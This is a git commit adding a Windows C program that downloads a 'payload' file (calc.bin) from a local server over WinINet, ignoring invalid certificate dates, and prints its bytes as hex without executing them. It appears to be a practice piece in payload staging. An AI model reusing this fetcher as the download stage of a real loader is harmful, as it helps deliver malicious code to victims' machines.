84d2d32415d38f1d3bc73d4c7d4ce0c8f6fc69b8
Jiniyas Shah <sanketshahts@gmail.com>
2024-02-20 19:25:58 +0545

    Add project files.

---
+++ main.c
@@ -0,0 +1,102 @@
+#include<stdio.h>
+#include<windows.h>
+#include<wininet.h>
+
+BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {
+
+	BOOL		bSTATE = TRUE;
+
+	HINTERNET	hInternet = NULL,hInternetFile = NULL;
+
+	DWORD		dwBytesRead = NULL;
+
+	SIZE_T		sSize = NULL;
+	PBYTE		pBytes = NULL, pTmpBytes = NULL;
+
+
+
+	hInternet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);
+	if (hInternet == NULL) {
+		printf("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
+		bSTATE = FALSE; goto _EndOfFunction;
+	}
+
+
+	hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
+	if (hInternetFile == NULL) {
+		printf("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
+		bSTATE = FALSE; goto _EndOfFunction;
+	}
+
+
+	pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
+	if (pTmpBytes == NULL) {
+		bSTATE = FALSE; goto _EndOfFunction;
+	}
+
+	while (TRUE) {
+
+		if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
+			printf("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
+			bSTATE = FALSE; goto _EndOfFunction;
+		}
+
+		sSize += dwBytesRead;
+
+		if (pBytes == NULL)
+			pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
+		else
+			pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);
+
+		if (pBytes == NULL) {
+			bSTATE = FALSE; goto _EndOfFunction;
+		}
+
+		memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);
+		memset(pTmpBytes, '\0', dwBytesRead);
+
+		if (dwBytesRead < 1024) {
+			break;
+		}
+	}
+
+
+
+	*pPayloadBytes = pBytes;
+	*sPayloadSize = sSize;
+
+_EndOfFunction:
+	if (hInternet)
+		InternetCloseHandle(hInternet);
+	if (hInternetFile)
+		InternetCloseHandle(hInternetFile);
+	if (hInternet)
+		InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
+	if (pTmpBytes)
+		LocalFree(pTmpBytes);
+	return bSTATE;
+}
+
+int main() {
+	LPCWSTR szUrl = L"http://127.0.0.1:8000/calc.bin";
+	PBYTE pPayloadBytes = NULL;
+	SIZE_T sPayloadSize = 0;
+
+	if (GetPayloadFromUrl(szUrl, &pPayloadBytes, &sPayloadSize)) {
+		// Process the payload as needed
+		for (size_t i = 0; i < sPayloadSize; i++) {
+			printf("%02X ", pPayloadBytes[i]);
+		}
+		// Free allocated memory
+		if (pPayloadBytes != NULL) {
+			LocalFree(pPayloadBytes);
+		}
+
+		return 0; // Indicate successful execution
+	}
+	else {
+		// Handle error
+		printf("[!] Failed to retrieve payload from %ls\n", szUrl);
+		return 1; // Indicate failure
+	}
+}
